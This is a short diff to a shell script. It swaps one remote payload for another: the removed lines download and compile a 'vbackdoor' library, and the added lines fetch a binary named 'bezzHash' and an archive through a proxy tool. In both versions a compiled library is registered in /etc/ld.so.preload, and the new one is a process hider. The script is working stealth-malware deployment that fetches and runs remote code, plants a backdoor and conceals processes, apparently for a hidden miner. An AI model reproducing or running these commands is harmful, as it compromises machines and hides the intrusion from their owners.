@@ -33,8 +33,12 @@ echo " "
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/veo/vbackdoor/main/vbackdoor.c
-vi vbackdoor.c
-gcc -Wall -fPIC -shared -o vbackdoor.so vbackdoor.c -ldl
-sudo mv vbackdoor.so /usr/local/lib/
-echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
